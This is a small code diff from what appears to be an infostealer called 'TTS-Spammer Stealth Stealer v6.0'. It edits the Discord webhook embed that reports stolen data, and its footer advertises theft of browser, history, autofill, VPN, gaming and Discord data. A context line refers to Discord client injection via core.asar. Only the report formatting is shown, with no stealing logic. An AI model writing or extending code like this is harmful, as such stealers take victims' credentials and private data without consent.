@@ -1545,7 +1545,7 @@ module.exports = require('./core.asar');
             embed = {
                 "embeds": [{
                     "title": "TTS-Spammer Stealth Stealer v6.0",
-                    "description": "**COMPLETE DATA EXTRACTION WITH DISCORD INJECTION**",
+                    "description": "**by cyberseall**",
                     "color": 0xff0000,
                     "fields": embed_fields,
                     "footer": {"text": "TT-Spammer stealth - Browser, History, Autofill, VPN, Gaming & Discord Stealer"},
